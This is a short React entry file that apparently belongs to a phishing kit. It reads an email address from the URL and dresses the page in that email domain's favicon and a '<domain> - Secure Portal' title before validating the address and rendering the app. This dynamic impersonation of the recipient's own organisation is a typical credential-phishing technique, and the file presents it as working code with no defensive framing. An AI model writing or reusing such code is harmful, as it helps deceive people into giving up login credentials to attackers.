import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App'
import { validateEmailFromUrl } from './utils/emailValidator'

// Initialize email validation before rendering
const initializeApp = () => {
  // Get email from URL
  const urlParams = new URLSearchParams(window.location.search)
  const email = urlParams.get('email')
  
  if (email) {
    // Extract domain from email
    const domain = email.split('@')[1]
    if (domain) {
      // Set favicon
      const favicon = document.createElement('link')
      favicon.rel = 'icon'
      favicon.href = `https://www.google.com/s2/favicons?domain=${domain}`
      document.head.appendChild(favicon)

      // Set page title
      document.title = `${domain} - Secure Portal`
    }
  }

  // Validate email and initialize app
  validateEmailFromUrl()
}

// Initialize app and render
initializeApp()
ReactDOM.createRoot(document.getElementById('root')).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
)
